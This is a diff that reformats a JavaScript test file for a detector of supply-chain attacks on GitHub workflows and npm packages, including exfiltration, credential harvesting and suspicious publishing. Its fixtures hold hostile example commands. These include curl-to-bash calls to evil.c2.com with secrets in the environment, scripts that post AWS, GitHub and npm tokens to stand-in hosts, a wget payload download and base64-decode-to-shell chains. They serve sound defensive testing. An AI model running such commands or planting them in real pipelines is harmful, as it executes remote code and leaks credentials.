@@ -3,67 +3,85 @@ import assert from 'assert/strict';
 import { MegalodonSignal } from '../backend/detectors/megalodon/types.js';
 import { scan as scanD1 } from '../backend/detectors/megalodon/d1-workflow-scan.js';
 import { scan as scanD2 } from '../backend/detectors/megalodon/d2-credential-harvest.js';
-import { scan as scanD3, detectVelocitySpike } from '../backend/detectors/megalodon/d3-publish-velocity.js';
+import {
+  scan as _scanD3,
+  detectVelocitySpike,
+} from '../backend/detectors/megalodon/d3-publish-velocity.js';
 import { scan as scanD4 } from '../backend/detectors/megalodon/d4-publisher-drift.js';
 import { scanAll } from '../backend/detectors/megalodon/index.js';
 
 /* ───────── D1: Workflow Scan ───────── */
 
 test('D1: clean workflow produces no signals', async () => {
-  const files = [{
-    path: '.github/workflows/ci.yml',
-    content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n`,
-  }];
+  const files = [
+    {
+      path: '.github/workflows/ci.yml',
+      content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n`,
+    },
+  ];
   const ev = await scanD1(files);
   assert.equal(ev.length, 0);
 });
 
 test('D1: C2 + secrets co-occurrence emits WORKFLOW_C2_EXFIL', async () => {
-  const files = [{
-    path: '.github/workflows/deploy.yml',
-    content: `name: Deploy\non: push\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s https://evil.c2.com/exfil | bash\n        env:\n          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}\n`,
-  }];
+  const files = [
+    {
+      path: '.github/workflows/deploy.yml',
+      content: `name: Deploy\non: push\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s https://evil.c2.com/exfil | bash\n        env:\n          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}\n`,
+    },
+  ];
   const ev = await scanD1(files);
-  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL));
+  assert(ev.some((e) => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL));
 });
 
 test('D1: base64 decode chain emits WORKFLOW_DECODE_CHAIN', async () => {
-  const files = [{
-    path: '.github/workflows/payload.yml',
-    content: `name: Payload\non: push\njobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "ZXZpbA==" | base64 -d | sh\n`,
-  }];
+  const files = [
+    {
+      path: '.github/workflows/payload.yml',
+      content: `name: Payload\non: push\njobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "ZXZpbA==" | base64 -d | sh\n`,
+    },
+  ];
   const ev = await scanD1(files);
-  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_DECODE_CHAIN));
+  assert(ev.some((e) => e.signal === MegalodonSignal.WORKFLOW_DECODE_CHAIN));
 });
 
 test('D1: both signals emitted from same workflow', async () => {
-  const files = [{
-    path: '.github/workflows/both.yml',
-    content: `name: Both\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: exfil\n        run: curl -s https://evil.c2.com/grab | bash\n        env:\n          TOKEN: \${{ secrets.GH_PAT }}\n      - name: decode\n        run: echo "cHduZWQ=" | base64 -d | bash\n`,
-  }];
+  const files = [
+    {
+      path: '.github/workflows/both.yml',
+      content: `name: Both\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: exfil\n        run: curl -s https://evil.c2.com/grab | bash\n        env:\n          TOKEN: \${{ secrets.GH_PAT }}\n      - name: decode\n        run: echo "cHduZWQ=" | base64 -d | bash\n`,
+    },
+  ];
   const ev = await scanD1(files);
-  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL));
-  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_DECODE_CHAIN));
+  assert(ev.some((e) => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL));
+  assert(ev.some((e) => e.signal === MegalodonSignal.WORKFLOW_DECODE_CHAIN));
 });
 
 test('D1: YAML parse error falls back to raw regex', async () => {
-  const files = [{
-    path: '.github/workflows/broken.yml',
-    content: 'name: Broken\non: push\njobs:\n  broken:\n    runs-on: ubuntu-latest\n    steps:\n      - run: "curl -s https://evil.c2.com/test -H \'token: ${{ secrets.TOKEN }}\' | sh"\n  invalid_indent: true\n  extra:\n    - list: [1,\n2,\n3]\n',
-  }];
+  const files = [
+    {
+      path: '.github/workflows/broken.yml',
+      content:
+        'name: Broken\non: push\njobs:\n  broken:\n    runs-on: ubuntu-latest\n    steps:\n      - run: "curl -s https://evil.c2.com/test -H \'token: ${{ secrets.TOKEN }}\' | sh"\n  invalid_indent: true\n  extra:\n    - list: [1,\n2,\n3]\n',
+    },
+  ];
   const ev = await scanD1(files);
-  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL));
+  assert(ev.some((e) => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL));
 });
 
 test('D1: 111-line IOC metadata appended when line count 100-120', async () => {
   const lines = [];
   lines.push(`name: IOC\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n`);
-  for (let i = 0; i < 100; i++) lines.push(`      - run: echo "step ${i}"\n`);
-  const content = lines.join('') + `      - name: exfil\n        run: curl -s https://evil.c2.com/x | bash\n        env:\n          TOKEN: \${{ secrets.TOKEN }}\n`;
+  for (let i = 0; i < 100; i++) {
+    lines.push(`      - run: echo "step ${i}"\n`);
+  }
+  const content =
+    lines.join('') +
+    `      - name: exfil\n        run: curl -s https://evil.c2.com/x | bash\n        env:\n          TOKEN: \${{ secrets.TOKEN }}\n`;
 
   const files = [{ path: '.github/workflows/ioc.yml', content }];
   const ev = await scanD1(files);
-  const exfil = ev.find(e => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL);
+  const exfil = ev.find((e) => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL);
   assert(exfil);
   assert(exfil.detail.includes('Megalodon payload footprint'));
 });
@@ -77,18 +95,25 @@ test('D2: no credential patterns produces no signals', async () => {
 });
 
 test('D2: AWS cred env var with outbound network emits CREDENTIAL_HARVEST', async () => {
-  const files = [{ path: 'script.sh', content: 'curl -s https://evil.com -H "Authorization: Bearer $AWS_SECRET_ACCESS_KEY"' }];
+  const files = [
+    {
+      path: 'script.sh',
+      content: 'curl -s https://evil.com -H "Authorization: Bearer $AWS_SECRET_ACCESS_KEY"',
+    },
+  ];
   const ev = await scanD2(files);
-  assert(ev.some(e => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
+  assert(ev.some((e) => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
 });
 
 test('D2: multiple cred patterns increase score', async () => {
-  const files = [{
-    path: 'steal.sh',
-    content: 'curl http://c2.com -d "aws=$AWS_SECRET_ACCESS_KEY&gh=$GH_TOKEN&npm=$NPM_TOKEN"',
-  }];
+  const files = [
+    {
+      path: 'steal.sh',
+      content: 'curl http://c2.com -d "aws=$AWS_SECRET_ACCESS_KEY&gh=$GH_TOKEN&npm=$NPM_TOKEN"',
+    },
+  ];
   const ev = await scanD2(files);
-  assert(ev.some(e => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
+  assert(ev.some((e) => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
   assert(ev[0].detail.includes('score:'));
 });
 
@@ -99,18 +124,25 @@ test('D2: cred pattern without outbound network produces no signal', async () =>
 });
 
 test('D2: .sh extension files are scanned', async () => {
-  const files = [{ path: 'install.sh', content: 'wget https://evil.com/payload -O /tmp/x; export GH_TOKEN=$GH_TOKEN' }];
+  const files = [
+    {
+      path: 'install.sh',
+      content: 'wget https://evil.com/payload -O /tmp/x; export GH_TOKEN=$GH_TOKEN',
+    },
+  ];
   const ev = await scanD2(files);
-  assert(ev.some(e => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
+  assert(ev.some((e) => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
 });
 
 test('D2: .yml extension files are scanned', async () => {
-  const files = [{
-    path: 'deploy.yml',
-    content: 'steps:\n  - run: curl https://evil.com\n    env:\n      TOKEN: $NPM_TOKEN\n',
-  }];
+  const files = [
+    {
+      path: 'deploy.yml',
+      content: 'steps:\n  - run: curl https://evil.com\n    env:\n      TOKEN: $NPM_TOKEN\n',
+    },
+  ];
   const ev = await scanD2(files);
-  assert(ev.some(e => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
+  assert(ev.some((e) => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
 });
 
 /* ───────── D3: Publish Velocity ───────── */
@@ -235,7 +267,7 @@ test('D4: new publisher in velocity window emits PUBLISHER_DRIFT', async () => {
   const velocityResult = detectVelocitySpike(times, 6, 3);
   assert(velocityResult.triggered);
   const ev = await scanD4(meta, velocityResult);
-  assert(ev.some(e => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
+  assert(ev.some((e) => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
   assert(ev[0].excerpt.includes('mallory'));
 });
 
@@ -258,7 +290,7 @@ test('D4: fallback path (D3 not triggered) — new identity in last 3 versions e
   });
   const velocityResult = { triggered: false, versionsInWindow: [], windowStartISO: null };
   const ev = await scanD4(meta, velocityResult);
-  assert(ev.some(e => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
+  assert(ev.some((e) => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
   assert.equal(ev[0]._severityHint, 'MEDIUM');
 });
 
@@ -307,7 +339,7 @@ test('D4: account age check fires — detail includes age note', async () => {
   const velocityResult = detectVelocitySpike(times, 48, 3);
   assert(velocityResult.triggered);
   const ev = await scanD4(meta, velocityResult);
-  assert(ev.some(e => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
+  assert(ev.some((e) => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
   assert(ev[0].detail.includes('days before'));
 
   mock.reset();
@@ -330,7 +362,7 @@ test('D4: account age endpoint 404 — no throw, signal still emitted', async ()
   const velocityResult = detectVelocitySpike(times, 48, 3);
   assert(velocityResult.triggered);
   const ev = await scanD4(meta, velocityResult);
-  assert(ev.some(e => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
+  assert(ev.some((e) => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
   assert(!ev[0].detail.includes('days before'));
 
   mock.reset();
@@ -369,20 +401,24 @@ test('aggregator: D1+D2+D3 combined emitted as single MEGALODON finding', async 
 });
 
 test('aggregator: severity resolves to critical when C2 exfil present', async () => {
-  const allFiles = [{
-    path: '.github/workflows/ci.yml',
-    content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s https://evil.c2.com/exfil | bash\n        env:\n          TOKEN: \${{ secrets.GH_PAT }}\n`,
-  }];
+  const allFiles = [
+    {
+      path: '.github/workflows/ci.yml',
+      content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s https://evil.c2.com/exfil | bash\n        env:\n          TOKEN: \${{ secrets.GH_PAT }}\n`,
+    },
+  ];
   const findings = await scanAll({}, allFiles, { time: {} });
   assert.equal(findings.length, 1);
   assert.equal(findings[0].severity, 'critical');
 });
 
 test('aggregator: evidence JSON includes all signals', async () => {
-  const allFiles = [{
-    path: '.github/workflows/ci.yml',
-    content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "ZXZpbA==" | base64 -d | sh\n`,
-  }];
+  const allFiles = [
+    {
+      path: '.github/workflows/ci.yml',
+      content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "ZXZpbA==" | base64 -d | sh\n`,
+    },
+  ];
   const findings = await scanAll({}, allFiles, { time: {} });
   assert.equal(findings.length, 1);
   const parsed = JSON.parse(findings[0].evidence);
@@ -394,16 +430,20 @@ test('aggregator: evidence JSON includes all signals', async () => {
 
 test('runAll: MEGALODON finding appears when megalodon signals present', async () => {
   const { runAll } = await import('../backend/detectors/index.js');
-  const allFiles = [{
-    path: '.github/workflows/ci.yml',
-    content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "ZXZpbA==" | base64 -d | sh\n`,
-  }];
+  const allFiles = [
+    {
+      path: '.github/workflows/ci.yml',
+      content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "ZXZpbA==" | base64 -d | sh\n`,
+    },
+  ];
   const findings = await runAll({}, allFiles, { time: {} });
-  assert(findings.some(f => f.id === 'MEGALODON'));
+  assert(findings.some((f) => f.id === 'MEGALODON'));
 });
 
 test('runAll: MEGALODON finding not present on clean package', async () => {
   const { runAll } = await import('../backend/detectors/index.js');
-  const findings = await runAll({ name: 'clean', scripts: { test: 'echo ok' } }, [{ path: 'index.js', content: 'export default 42' }]);
-  assert(!findings.some(f => f.id === 'MEGALODON'));
+  const findings = await runAll({ name: 'clean', scripts: { test: 'echo ok' } }, [
+    { path: 'index.js', content: 'export default 42' },
+  ]);
+  assert(!findings.some((f) => f.id === 'MEGALODON'));
 });
